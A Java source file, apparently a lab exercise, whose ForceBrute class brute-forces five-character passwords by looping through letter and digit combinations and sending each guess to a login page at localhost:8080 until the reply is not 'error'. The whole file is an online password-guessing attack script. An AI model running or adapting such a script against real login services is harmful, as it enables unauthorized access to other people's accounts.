import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;

public class ForceBrute extends Attack {
    // public User User1= new User("baba","abaaa");

    public ForceBrute() {

    }

    public String mdpCracker() throws IOException {
        String dico = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789";
        String mdp = "";
        // boolean bool;
        for (int i = 0; i < dico.length(); i++) {
            for (int j = 0; j < dico.length(); j++) {
                for (int w = 0; w < dico.length(); w++) {
                    for (int k = 0; k < dico.length(); k++) {
                        for (int z = 0; z < dico.length(); z++) {

                            mdp = dico.charAt(i) + "" + dico.charAt(j) + dico.charAt(w) + dico.charAt(k)
                                    + dico.charAt(z);
                            System.out.println("" + mdp);
                            URL url = new URL("http://localhost:8080/User.php?pwd=" + mdp);
                            URLConnection connection = url.openConnection();

                            // `HttpURLConnection` connection = (HttpURLConnection) url.openConnection();
                            // connection.setRequestMethod("GET");

                            try (BufferedReader in = new BufferedReader(
                                    new InputStreamReader(connection.getInputStream()))) {
                                String line;
                                while ((line = in.readLine()) != null) {
                                    
                                    System.out.println(line);
                                    if(line.equals("error")){
                                    }else{
                                        System.exit(0);

                                    }
                                }
                                
                                
                            }

                            // bool= User1.authenticate(mdp);

                            // System.out.println(bool);
                            // if (bool==true) {
                            // System.out.println("mdpCraked value:"+mdp);
                            // return mdp;
                            // }

                        }

                    }
                }
            }
        }
        System.out.print(mdp);
        return mdp;

    }

}
